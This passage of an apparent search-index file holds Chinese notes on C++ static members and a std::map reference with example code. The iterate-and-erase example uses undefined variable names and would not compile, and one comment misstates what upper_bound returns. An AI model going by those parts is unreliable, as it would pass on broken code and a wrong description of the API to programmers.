\u5728\u4f7f\u7528\u5305\u542b\u9759\u6001\u6210\u5458\u7684\u7c7b\u65f6\uff0c\u6709\u65f6\u5019\u4f1a\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u751f\u6210\u4e34\u65f6\u7684\u9690\u85cf\u7684\u7c7b\u5bf9\u8c61\uff0c\u800c\u8fd9\u4e2a\u4e34\u65f6\u5bf9\u8c61\u5728\u6d88\u4ea1\u65f6\u4f1a\u8c03\u7528\u6790\u6784\u51fd\u6570\u6709\u53ef\u80fd\u4f1a\u5bf9\u9759\u6001\u53d8\u91cf\u505a\u64cd\u4f5c\uff08\u4f8b\u5982total_num--\uff09\uff0c\u53ef\u662f\u8fd9\u4e9b\u5bf9\u8c61\u5728\u751f\u6210\u65f6\u5374\u6ca1\u6709\u6267\u884c\u6784\u9020\u51fd\u6570\u4e2d\u7684total_num++\u7684\u64cd\u4f5c\u3002\u89e3\u51b3\u65b9\u6848\u662f\u4e3a\u8fd9\u4e2a\u7c7b\u5199\u4e00\u4e2a\u62f7\u8d1d\u6784\u9020\u51fd\u6570\uff0c\u5728\u8be5\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u4e2d\u5b8c\u6210total_num++\u7684\u64cd\u4f5c\u3002","title":"\u9759\u6001\u6210\u5458\u51fd\u6570"},{"location":"c_cpp/2021_02_20_cpp_static/#ref","text":"https://zhuanlan.zhihu.com/p/37439983","title":"REF"},{"location":"c_cpp/2021_02_23_cpp_map_reference/","text":"C++ Map\u4f7f\u7528\u6c47\u603b \u00b6 \u603b\u7ed3Map\u7684\u5e38\u7528\u65b9\u6cd5\uff1b\u4ee5\u53ca\u5982\u4f55\u5728\u5bf9Map\u8fdb\u884c\u904d\u5386\u7684\u540c\u65f6\uff0c\u8fdb\u884c\u5220\u9664\u64cd\u4f5c\u3002 \u6587\u6863 Map\u7279\u6027 \u00b6 Associative \u00b6 Elements in associative containers are referenced by their key and not by their absolute position in the container. Ordered \u00b6 The elements in the container follow a strict order at all times. All inserted elements are given a position in this order. Map \u00b6 Each element associates a key to a mapped value : Keys are meant to identify the elements whose main content is the mapped value . Unique keys \u00b6 No two elements in the container can have equivalent keys . Allocator-aware \u00b6 The container uses an allocator object to dynamically handle its storage needs. \u5e38\u7528\u65b9\u6cd5\uff08C++11\uff09 \u00b6 \u58f0\u660e\u548c\u521d\u59cb\u5316 \u00b6 #include<iostream> #include<map> #include<string> using namespace std; int main() { // \u4f7f\u7528{}\u521d\u59cb\u5316\u65f6\u4ecec++11\u5f00\u59cb\u7684 map<string, int> words = { {\"Jim\",2012} ,{\"Tom\",2023} }; } \u66f4\u65b0 \u00b6 \u63d2\u5165 \u00b6 \u4f7f\u7528[]\u63d2\u5165 \u00b6 map<string, int> words; words[\"apple\"] = 2; \u5982\u679ckey\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u4f1a\u4f5c\u8d4b\u503c\u4fee\u6539\uff0c\u6ca1\u6709\u5219\u63d2\u5165\u3002\u4f7f\u7528[]\u8bbf\u95ee\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684key\u65f6\uff0c\u503c\u4f1a\u521d\u59cb\u5316\u4f4d0\u6216'\\0'\u6216\"\"(\u611f\u89c9\u4e0d\u5b89\u5168)\u3002 \u4f7f\u7528insert\u63d2\u5165 \u00b6 c++11\u4e2d\u67094\u79cd\u65b9\u6cd5\uff0c\u65b0\u589e\u4e86 interlizer_list \u8fd9\u79cd\u65b9\u6cd5\u3002 \u5177\u4f53\u6587\u6863 #include <iostream> #include <map> int main () { std::map<char,int> mymap; // first insert function version (single parameter): mymap.insert ( std::pair<char,int>('a',100) ); mymap.insert ( std::pair<char,int>('z',200) ); // \u4f7f\u7528\u8fd4\u56de\u503c\u5224\u65ad\u63d2\u5165\u662f\u5426\u6210\u529f std::pair<std::map<char,int>::iterator,bool> ret; ret = mymap.insert ( std::pair<char,int>('z',500) ); if (ret.second==false) { // \u5f53\u6210\u529f\u63d2\u5165\u65f6\uff0c\u4e3atrue std::cout << \"element 'z' already existed\"; std::cout << \" with a value of \" << ret.first->second << '\\n'; } // second insert function version (with hint position): std::map<char,int>::iterator it = mymap.begin(); mymap.insert (it, std::pair<char,int>('b',300)); // max efficiency inserting mymap.insert (it, std::pair<char,int>('c',400)); // no max efficiency inserting // \u6ce8\u610f, it\u53ea\u662f\u4e00\u4e2ahint\uff0c\u5e76\u4e0d\u5f3a\u5236\u628a\u65b0\u5143\u7d20\u63d2\u5165\u8be5\u4f4d\u7f6e(Map\u662f\u4e25\u683c\u6709\u5e8f\u7684) // third insert function version (range insertion): std::map<char,int> anothermap; anothermap.insert(mymap.begin(),mymap.find('c')); // c++11\u5f00\u59cb\u652f\u6301\u7528\u5217\u8868\u63d2\u5165 anothermap.insert({ { 'd', 100 }, {'e', 200} }); // showing contents: std::cout << \"mymap contains:\\n\"; for (it=mymap.begin(); it!=mymap.end(); ++it) std::cout << it->first << \" => \" << it->second << '\\n'; std::cout << \"anothermap contains:\\n\"; for (it=anothermap.begin(); it!=anothermap.end(); ++it) std::cout << it->first << \" => \" << it->second << '\\n'; return 0; } \u5220\u9664\u5143\u7d20 \u00b6 erase \u00b6 iterator erase (const_iterator position); size_type erase (const key_type& k); //\u5220\u9664key\u4e3ak\u7684\u5143\u7d20\uff0c\u8fd4\u56de\u5220\u9664\u4e86\u591a\u5c11\u4e2a\u5143\u7d20 iterator erase (const_iterator first, const_iterator last); // \u5220\u9664\u591a\u4e2a\u5143\u7d20 \u7b2c1\u548c\u7b2c3\u4e2aerase\u8fd4\u56de\u5220\u9664\u5143\u7d20\u7684\u6307\u5411\u4e0b\u4e00\u4e2a\u7684iterator The other versions return an iterator to the element that follows the last element removed (or map::end , if the last element was removed). clear \u00b6 void clear() noexcept; \u5220\u9664\u6240\u6709\u5143\u7d20 \u4ea4\u6362swap \u00b6 void swap (map& x); \u548c\u53e6\u4e00\u4e2a\u76f8\u540c\u7c7b\u578b\u7684map\u4ea4\u6362\u5143\u7d20\u3002 std::map<char,int> foo,bar; foo.swap(bar); emplace\u548cemplace_hint \u00b6 \u7c7b\u4f3c\u4e8e\u63d2\u5165\uff0c\u4e3ac++11\u65b0\u589e template <class... Args> pair<iterator,bool> emplace (Args&&... args); template <class... Args> iterator emplace_hint (const_iterator position, Args&&... args); \u793a\u4f8b // map::emplace #include <iostream> #include <map> int main () { std::map<char,int> mymap; mymap.emplace('x',100); mymap.emplace('y',200); mymap.emplace('z',100); std::cout << \"mymap contains:\"; for (auto& x: mymap) std::cout << \" [\" << x.first << ':' << x.second << ']'; std::cout << '\\n'; return 0; } \u53d6\u503c \u00b6 \u64cd\u4f5c\u7b26[] \u00b6 \u8bbf\u95ee\u5230\u4e0d\u5b58\u5728\u7684key\u65f6\uff0c\u4f1a\u5f15\u53d1\u63d2\u5165\u64cd\u4f5c\u3002\u5982\u679c\u6ca1\u6709\u8d4b\u503c\u7ed9\u65b0\u7684\u5143\u7d20\uff0c\u5219\u4f7f\u7528\u9ed8\u8ba4\u503c If k does not match the key of any element in the container, the function inserts a new element with that key and returns a reference to its mapped value. Notice that this always increases the container size by one, even if no mapped value is assigned to the element (the element is constructed using its default constructor). at() \u00b6 c++11\u65b0\u589e\uff0c\u6216\u68c0\u6d4b\u67e5\u8be2\u7684key\u662f\u5426\u5b58\u5728\u3002\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u89e6\u53d1 out_of_range \u5f02\u5e38\u3002 \u5bb9\u91cf\u67e5\u8be2 \u00b6 // \u67e5\u8be2map\u662f\u5426\u4e3a\u7a7a bool empty(); // \u67e5\u8be2map\u4e2d\u952e\u503c\u5bf9\u7684\u6570\u91cf size_t size(); // \u67e5\u8be2map\u6240\u80fd\u5305\u542b\u7684\u6700\u5927\u952e\u503c\u5bf9\u6570\u91cf\uff0c\u548c\u7cfb\u7edf\u548c\u5e94\u7528\u5e93\u6709\u5173\u3002 // \u6b64\u5916\uff0c\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u7528\u6237\u4e00\u5b9a\u53ef\u4ee5\u5b58\u8fd9\u4e48\u591a\uff0c\u5f88\u53ef\u80fd\u8fd8\u6ca1\u8fbe\u5230\u5c31\u5df2\u7ecf\u5f00\u8f9f\u5185\u5b58\u5931\u8d25\u4e86 size_t max_size(); \u8fed\u4ee3\u5668 \u00b6 begin\u548cend\uff0c\u4ee5\u53cacbegin\u548ccend \u00b6 \u5176\u4e2dcbegin\u548ccend\u662fc++11\u65b0\u589e\u7684 /*begin & end*/ iterator begin() noexcept; const_iterator begin() const noexcept; iterator end() noexcept; const_iterator end() const noexcept; /*cbegin & cend*/ const_iterator cbegin() const noexcept; const_iterator cend() const noexcept; A const_iterator is an iterator that points to const content. This iterator can be increased and decreased (unless it is itself also const), just like the iterator returned by map::begin , but it cannot be used to modify the contents it points to, even if the map object is not itself const. rbegin\u548crend\uff0c\u4ee5\u53cacrbegin\u548ccrend \u00b6 \u5176\u4e2dcrbegin\u548ccrend\u662fc++11\u65b0\u589e\u7684 /*rbegin & rend*/ // \u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684reverse_iterator reverse_iterator rbegin() noexcept; const_reverse_iterator rbegin() const noexcept; // \u8fd4\u56de\u6307\u5411\u7b2c\u4e00\u4e2a\u5143\u7d20\u4e4b\u524d\u7684reverse_iterator reverse_iterator rend() noexcept; const_reverse_iterator rend() const noexcept; /*crbegin & crend*/ const_reverse_iterator crbegin() const noexcept; const_reverse_iterator crend() const noexcept; \u793a\u4f8b // map::rbegin/rend #include <iostream> #include <map> int main () { std::map<char,int> mymap; mymap['x'] = 100; mymap['y'] = 200; mymap['z'] = 300; // show content: std::map<char,int>::reverse_iterator rit; for (rit=mymap.rbegin(); rit!=mymap.rend(); ++rit) std::cout << rit->first << \" => \" << rit->second << '\\n'; return 0; } \u8f93\u51fa z => 300 y => 200 x => 100 \u5176\u5b83\u64cd\u4f5c \u00b6 // \u67e5\u627ekey\u4e3ak\u7684\u5143\u7d20\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u8fd4\u56deend iterator find (const key_type& k); const_iterator find (const key_type& k) const; // \u67e5\u8be2key\u4e3ak\u7684\u5143\u7d20\u7684\u4e2a\u6570\uff0c\u5bf9\u4e8emap\u6765\u8bf4\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u4e00\u5b9a\u4e3a1 size_type count (const key_type& k) const; // \u6bd4\u8f83 key_compare key_comp() const; // \u8fd4\u56de\u4e00\u4e2a\u7528\u4e8e\u6bd4\u8f83key\u7684\u6bd4\u8f83\u5668 value_compare value_comp() const; // \u8fd4\u56de\u4e00\u4e2a\u7528\u4e8e\u6bd4\u8f83value\u7684\u6bd4\u8f83\u5668 //\u793a\u4f8b map<char,int> mymap; map<char,int>::key_compare mycomp = mymap.key_comp(); mymap['a']=100; mymap['b']=200; mycomp('a', 'b'); // a\u6392\u5728b\u524d\u9762\uff0c\u56e0\u6b64\u8fd4\u56de\u7ed3\u679c\u4e3atrue //\u4e0a\u4e0b\u754c iterator lower_bound (const key_type& k); // \u6307\u5411\u5927\u4e8e\u7b49\u4e8ek\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 const_iterator lower_bound (const key_type& k) const; iterator upper_bound (const key_type& k); // \u6307\u5411\u5c0f\u4e8e\u7b49\u4e8ek\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 const_iterator upper_bound (const key_type& k) const; pair<const_iterator,const_iterator> equal_range (const key_type& k) const; // \u7b49\u4e8ekey\u7684\u5143\u7d20\u8303\u56f4\uff0c\u5bf9\u4e8emap\u6765\u8bf4\uff0c\u6700\u591a\u53ea\u67091\u4e2a pair<iterator,iterator> equal_range (const key_type& k); Map\u904d\u5386\u5220\u9664 \u00b6 \u5bf9\u4e8ec++\u91cc\u9762\u7684\u5bb9\u5668, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528iterator\u8fdb\u884c\u65b9\u4fbf\u7684\u904d\u5386. \u4f46\u662f\u5f53\u6211\u4eec\u901a\u8fc7iterator\u5bf9vector/map\u7b49\u8fdb\u884c\u5220\u9664\u65f6, \u6211\u4eec\u5c31\u8981\u5c0f\u5fc3\u4e86, \u56e0\u4e3a\u64cd\u4f5c\u5f80\u5f80\u4f1a\u5bfc\u81f4iterator\u5931\u6548, \u4e4b\u540e\u7684\u884c\u4e3a\u90fd\u53d8\u5f97\u4e0d\u53ef\u9884\u77e5. int main(int argc, char* argv[]) { map<string, string> mapData; mapData[\"a\"] = \"aaa\"; mapData[\"b\"] = \"bbb\"; mapData[\"c\"] = \"ccc\"; for (map<string, string>::iterator iter=mapData.begin(); iiter!=mapData.end();) { if (i->first == \"b\") { mapData.erase(iter++); } else { iter++; } } return 0; } \u5206\u6790mapData.erase(i++)\u8bed\u53e5\uff0cmap\u4e2d\u5728\u5220\u9664iter\u7684\u65f6\u5019\uff0c\u5148\u5c06iter\u505a\u7f13\u5b58\uff0c\u7136\u540e\u6267\u884citer++\u4f7f\u4e4b\u6307\u5411\u4e0b\u4e00\u4e2a\u7ed3\u70b9\uff0c\u518d\u8fdb\u5165erase\u51fd\u6570\u4f53\u4e2d\u6267\u884c\u5220\u9664\u64cd\u4f5c\uff0c\u5220\u9664\u65f6\u4f7f\u7528\u7684iter\u5c31\u662f\u7f13\u5b58\u4e0b\u6765\u7684iter(\u4e5f\u5c31\u662f\u5f53\u524diter(\u505a\u4e86\u52a0\u64cd\u4f5c\u4e4b\u540e\u7684iter)\u6240\u6307\u5411\u7ed3\u70b9\u7684\u4e0a\u4e00\u4e2a\u7ed3\u70b9)\u3002 \u53ef\u4ee5\u770b\u51fa\uff08mapData.erase(iter++) \uff09\u548c\uff08mapData.erase(iter); iter++; \uff09\u8fd9\u4e2a\u6267\u884c\u5e8f\u5217\u662f\u4e0d\u76f8\u540c\u7684\u3002\u524d\u8005\u5728erase\u6267\u884c\u524d\u8fdb\u884c\u4e86\u52a0\u64cd\u4f5c\uff0c\u5728it\u88ab\u5220\u9664(\u5931\u6548)\u524d\u8fdb\u884c\u4e86\u52a0\u64cd\u4f5c\uff0c\u662f\u5b89\u5168\u7684\uff1b\u540e\u8005\u662f\u5728erase\u6267\u884c\u540e\u624d\u8fdb\u884c\u52a0\u64cd\u4f5c\uff0c\u800c\u6b64\u65f6iter\u5df2\u7ecf\u88ab\u5220\u9664(\u5f53\u524d\u7684\u8fed\u4ee3\u5668\u5df2\u7ecf\u5931\u6548\u4e86)\uff0c\u5bf9\u4e00\u4e2a\u5df2\u7ecf\u5931\u6548\u7684\u8fed\u4ee3\u5668\u8fdb\u884c\u52a0\u64cd\u4f5c\uff0c\u884c\u4e3a\u662f\u4e0d\u53ef\u9884\u671f\u7684\uff0c\u8fd9\u79cd\u5199\u6cd5\u52bf\u5fc5\u4f1a\u5bfc\u81f4 map\u64cd\u4f5c\u7684\u5931\u8d25\u5e76\u5f15\u8d77\u8fdb\u7a0b\u7684\u5f02\u5e38\u3002 \u800c\u5bf9\u4e8evector\uff0c\u53ef\u4ee5\u8fd9\u6837 iter=v.erase(iter);","title":"C++ Map\u4f7f\u7528\u6c47\u603b"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#c-map","text":"\u603b\u7ed3Map\u7684\u5e38\u7528\u65b9\u6cd5\uff1b\u4ee5\u53ca\u5982\u4f55\u5728\u5bf9Map\u8fdb\u884c\u904d\u5386\u7684\u540c\u65f6\uff0c\u8fdb\u884c\u5220\u9664\u64cd\u4f5c\u3002 \u6587\u6863","title":"C++ Map\u4f7f\u7528\u6c47\u603b"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#map","text":"","title":"Map\u7279\u6027"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#associative","text":"Elements in associative containers are referenced by their key and not by their absolute position in the container.","title":"Associative"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#ordered","text":"The elements in the container follow a strict order at all times. All inserted elements are given a position in this order.","title":"Ordered"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#map_1","text":"Each element associates a key to a mapped value : Keys are meant to identify the elements whose main content is the mapped value .","title":"Map"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#unique-keys","text":"No two elements in the container can have equivalent keys .","title":"Unique keys"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#allocator-aware","text":"The container uses an allocator object to dynamically handle its storage needs.","title":"Allocator-aware"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#c11","text":"","title":"\u5e38\u7528\u65b9\u6cd5\uff08C++11\uff09"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#_1","text":"#include<iostream> #include<map> #include<string> using namespace std; int main() { // \u4f7f\u7528{}\u521d\u59cb\u5316\u65f6\u4ecec++11\u5f00\u59cb\u7684 map<string, int> words = { {\"Jim\",2012} ,{\"Tom\",2023} }; }","title":"\u58f0\u660e\u548c\u521d\u59cb\u5316"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#_2","text":"","title":"\u66f4\u65b0"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#_3","text":"","title":"\u63d2\u5165"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#_4","text":"map<string, int> words; words[\"apple\"] = 2; \u5982\u679ckey\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u4f1a\u4f5c\u8d4b\u503c\u4fee\u6539\uff0c\u6ca1\u6709\u5219\u63d2\u5165\u3002\u4f7f\u7528[]\u8bbf\u95ee\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684key\u65f6\uff0c\u503c\u4f1a\u521d\u59cb\u5316\u4f4d0\u6216'\\0'\u6216\"\"(\u611f\u89c9\u4e0d\u5b89\u5168)\u3002","title":"\u4f7f\u7528[]\u63d2\u5165"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#insert","text":"c++11\u4e2d\u67094\u79cd\u65b9\u6cd5\uff0c\u65b0\u589e\u4e86 interlizer_list \u8fd9\u79cd\u65b9\u6cd5\u3002 \u5177\u4f53\u6587\u6863 #include <iostream> #include <map> int main () { std::map<char,int> mymap; // first insert function version (single parameter): mymap.insert ( std::pair<char,int>('a',100) ); mymap.insert ( std::pair<char,int>('z',200) ); // \u4f7f\u7528\u8fd4\u56de\u503c\u5224\u65ad\u63d2\u5165\u662f\u5426\u6210\u529f std::pair<std::map<char,int>::iterator,bool> ret; ret = mymap.insert ( std::pair<char,int>('z',500) ); if (ret.second==false) { // \u5f53\u6210\u529f\u63d2\u5165\u65f6\uff0c\u4e3atrue std::cout << \"element 'z' already existed\"; std::cout << \" with a value of \" << ret.first->second << '\\n'; } // second insert function version (with hint position): std::map<char,int>::iterator it = mymap.begin(); mymap.insert (it, std::pair<char,int>('b',300)); // max efficiency inserting mymap.insert (it, std::pair<char,int>('c',400)); // no max efficiency inserting // \u6ce8\u610f, it\u53ea\u662f\u4e00\u4e2ahint\uff0c\u5e76\u4e0d\u5f3a\u5236\u628a\u65b0\u5143\u7d20\u63d2\u5165\u8be5\u4f4d\u7f6e(Map\u662f\u4e25\u683c\u6709\u5e8f\u7684) // third insert function version (range insertion): std::map<char,int> anothermap; anothermap.insert(mymap.begin(),mymap.find('c')); // c++11\u5f00\u59cb\u652f\u6301\u7528\u5217\u8868\u63d2\u5165 anothermap.insert({ { 'd', 100 }, {'e', 200} }); // showing contents: std::cout << \"mymap contains:\\n\"; for (it=mymap.begin(); it!=mymap.end(); ++it) std::cout << it->first << \" => \" << it->second << '\\n'; std::cout << \"anothermap contains:\\n\"; for (it=anothermap.begin(); it!=anothermap.end(); ++it) std::cout << it->first << \" => \" << it->second << '\\n'; return 0; }","title":"\u4f7f\u7528insert\u63d2\u5165"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#_5","text":"","title":"\u5220\u9664\u5143\u7d20"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#erase","text":"iterator erase (const_iterator position); size_type erase (const key_type& k); //\u5220\u9664key\u4e3ak\u7684\u5143\u7d20\uff0c\u8fd4\u56de\u5220\u9664\u4e86\u591a\u5c11\u4e2a\u5143\u7d20 iterator erase (const_iterator first, const_iterator last); // \u5220\u9664\u591a\u4e2a\u5143\u7d20 \u7b2c1\u548c\u7b2c3\u4e2aerase\u8fd4\u56de\u5220\u9664\u5143\u7d20\u7684\u6307\u5411\u4e0b\u4e00\u4e2a\u7684iterator The other versions return an iterator to the element that follows the last element removed (or map::end , if the last element was removed).","title":"erase"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#clear","text":"void clear() noexcept; \u5220\u9664\u6240\u6709\u5143\u7d20","title":"clear"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#swap","text":"void swap (map& x); \u548c\u53e6\u4e00\u4e2a\u76f8\u540c\u7c7b\u578b\u7684map\u4ea4\u6362\u5143\u7d20\u3002 std::map<char,int> foo,bar; foo.swap(bar);","title":"\u4ea4\u6362swap"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#emplaceemplace_hint","text":"\u7c7b\u4f3c\u4e8e\u63d2\u5165\uff0c\u4e3ac++11\u65b0\u589e template <class... Args> pair<iterator,bool> emplace (Args&&... args); template <class... Args> iterator emplace_hint (const_iterator position, Args&&... args); \u793a\u4f8b // map::emplace #include <iostream> #include <map> int main () { std::map<char,int> mymap; mymap.emplace('x',100); mymap.emplace('y',200); mymap.emplace('z',100); std::cout << \"mymap contains:\"; for (auto& x: mymap) std::cout << \" [\" << x.first << ':' << x.second << ']'; std::cout << '\\n'; return 0; }","title":"emplace\u548cemplace_hint"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#_6","text":"","title":"\u53d6\u503c"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#_7","text":"\u8bbf\u95ee\u5230\u4e0d\u5b58\u5728\u7684key\u65f6\uff0c\u4f1a\u5f15\u53d1\u63d2\u5165\u64cd\u4f5c\u3002\u5982\u679c\u6ca1\u6709\u8d4b\u503c\u7ed9\u65b0\u7684\u5143\u7d20\uff0c\u5219\u4f7f\u7528\u9ed8\u8ba4\u503c If k does not match the key of any element in the container, the function inserts a new element with that key and returns a reference to its mapped value. Notice that this always increases the container size by one, even if no mapped value is assigned to the element (the element is constructed using its default constructor).","title":"\u64cd\u4f5c\u7b26[]"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#at","text":"c++11\u65b0\u589e\uff0c\u6216\u68c0\u6d4b\u67e5\u8be2\u7684key\u662f\u5426\u5b58\u5728\u3002\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u89e6\u53d1 out_of_range \u5f02\u5e38\u3002","title":"at()"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#_8","text":"// \u67e5\u8be2map\u662f\u5426\u4e3a\u7a7a bool empty(); // \u67e5\u8be2map\u4e2d\u952e\u503c\u5bf9\u7684\u6570\u91cf size_t size(); // \u67e5\u8be2map\u6240\u80fd\u5305\u542b\u7684\u6700\u5927\u952e\u503c\u5bf9\u6570\u91cf\uff0c\u548c\u7cfb\u7edf\u548c\u5e94\u7528\u5e93\u6709\u5173\u3002 // \u6b64\u5916\uff0c\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u7528\u6237\u4e00\u5b9a\u53ef\u4ee5\u5b58\u8fd9\u4e48\u591a\uff0c\u5f88\u53ef\u80fd\u8fd8\u6ca1\u8fbe\u5230\u5c31\u5df2\u7ecf\u5f00\u8f9f\u5185\u5b58\u5931\u8d25\u4e86 size_t max_size();","title":"\u5bb9\u91cf\u67e5\u8be2"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#_9","text":"","title":"\u8fed\u4ee3\u5668"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#beginendcbegincend","text":"\u5176\u4e2dcbegin\u548ccend\u662fc++11\u65b0\u589e\u7684 /*begin & end*/ iterator begin() noexcept; const_iterator begin() const noexcept; iterator end() noexcept; const_iterator end() const noexcept; /*cbegin & cend*/ const_iterator cbegin() const noexcept; const_iterator cend() const noexcept; A const_iterator is an iterator that points to const content. This iterator can be increased and decreased (unless it is itself also const), just like the iterator returned by map::begin , but it cannot be used to modify the contents it points to, even if the map object is not itself const.","title":"begin\u548cend\uff0c\u4ee5\u53cacbegin\u548ccend"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#rbeginrendcrbegincrend","text":"\u5176\u4e2dcrbegin\u548ccrend\u662fc++11\u65b0\u589e\u7684 /*rbegin & rend*/ // \u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684reverse_iterator reverse_iterator rbegin() noexcept; const_reverse_iterator rbegin() const noexcept; // \u8fd4\u56de\u6307\u5411\u7b2c\u4e00\u4e2a\u5143\u7d20\u4e4b\u524d\u7684reverse_iterator reverse_iterator rend() noexcept; const_reverse_iterator rend() const noexcept; /*crbegin & crend*/ const_reverse_iterator crbegin() const noexcept; const_reverse_iterator crend() const noexcept; \u793a\u4f8b // map::rbegin/rend #include <iostream> #include <map> int main () { std::map<char,int> mymap; mymap['x'] = 100; mymap['y'] = 200; mymap['z'] = 300; // show content: std::map<char,int>::reverse_iterator rit; for (rit=mymap.rbegin(); rit!=mymap.rend(); ++rit) std::cout << rit->first << \" => \" << rit->second << '\\n'; return 0; } \u8f93\u51fa z => 300 y => 200 x => 100","title":"rbegin\u548crend\uff0c\u4ee5\u53cacrbegin\u548ccrend"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#_10","text":"// \u67e5\u627ekey\u4e3ak\u7684\u5143\u7d20\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u8fd4\u56deend iterator find (const key_type& k); const_iterator find (const key_type& k) const; // \u67e5\u8be2key\u4e3ak\u7684\u5143\u7d20\u7684\u4e2a\u6570\uff0c\u5bf9\u4e8emap\u6765\u8bf4\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u4e00\u5b9a\u4e3a1 size_type count (const key_type& k) const; // \u6bd4\u8f83 key_compare key_comp() const; // \u8fd4\u56de\u4e00\u4e2a\u7528\u4e8e\u6bd4\u8f83key\u7684\u6bd4\u8f83\u5668 value_compare value_comp() const; // \u8fd4\u56de\u4e00\u4e2a\u7528\u4e8e\u6bd4\u8f83value\u7684\u6bd4\u8f83\u5668 //\u793a\u4f8b map<char,int> mymap; map<char,int>::key_compare mycomp = mymap.key_comp(); mymap['a']=100; mymap['b']=200; mycomp('a', 'b'); // a\u6392\u5728b\u524d\u9762\uff0c\u56e0\u6b64\u8fd4\u56de\u7ed3\u679c\u4e3atrue //\u4e0a\u4e0b\u754c iterator lower_bound (const key_type& k); // \u6307\u5411\u5927\u4e8e\u7b49\u4e8ek\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 const_iterator lower_bound (const key_type& k) const; iterator upper_bound (const key_type& k); // \u6307\u5411\u5c0f\u4e8e\u7b49\u4e8ek\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 const_iterator upper_bound (const key_type& k) const; pair<const_iterator,const_iterator> equal_range (const key_type& k) const; // \u7b49\u4e8ekey\u7684\u5143\u7d20\u8303\u56f4\uff0c\u5bf9\u4e8emap\u6765\u8bf4\uff0c\u6700\u591a\u53ea\u67091\u4e2a pair<iterator,iterator> equal_range (const key_type& k);","title":"\u5176\u5b83\u64cd\u4f5c"},{"location":"c_cpp/2021_02_23_cpp_map_reference/#map_2","text":"\u5bf9\u4e8ec++\u91cc\u9762\u7684\u5bb9\u5668, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528iterator\u8fdb\u884c\u65b9\u4fbf\u7684\u904d\u5386. \u4f46\u662f\u5f53\u6211\u4eec\u901a\u8fc7iterator\u5bf9vector/map\u7b49\u8fdb\u884c\u5220\u9664\u65f6, \u6211\u4eec\u5c31\u8981\u5c0f\u5fc3\u4e86, \u56e0\u4e3a\u64cd\u4f5c\u5f80\u5f80\u4f1a\u5bfc\u81f4iterator\u5931\u6548, \u4e4b\u540e\u7684\u884c\u4e3a\u90fd\u53d8\u5f97\u4e0d\u53ef\u9884\u77e5. int main(int argc, char* argv[]) { map<string, string> mapData; mapData[\"a\"] = \"aaa\"; mapData[\"b\"] = \"bbb\"; mapData[\"c\"] = \"ccc\"; for (map<string, string>::iterator iter=mapData.begin(); iiter!=mapData.end();) { if (i->first == \"b\") { mapData.erase(iter++); } else { iter++; } } return 0; } \u5206\u6790mapData.erase(i++)\u8bed\u53e5\uff0cmap\u4e2d\u5728\u5220\u9664iter\u7684\u65f6\u5019\uff0c\u5148\u5c06iter\u505a\u7f13\u5b58\uff0c\u7136\u540e\u6267\u884citer++\u4f7f\u4e4b\u6307\u5411\u4e0b\u4e00\u4e2a\u7ed3\u70b9\uff0c\u518d\u8fdb\u5165erase\u51fd\u6570\u4f53\u4e2d\u6267\u884c\u5220\u9664\u64cd\u4f5c\uff0c\u5220\u9664\u65f6\u4f7f\u7528\u7684iter\u5c31\u662f\u7f13\u5b58\u4e0b\u6765\u7684iter(\u4e5f\u5c31\u662f\u5f53\u524diter(\u505a\u4e86\u52a0\u64cd\u4f5c\u4e4b\u540e\u7684iter)\u6240\u6307\u5411\u7ed3\u70b9\u7684\u4e0a\u4e00\u4e2a\u7ed3\u70b9)\u3002 \u53ef\u4ee5\u770b\u51fa\uff08mapData.erase(iter++) \uff09\u548c\uff08mapData.erase(iter); iter++; 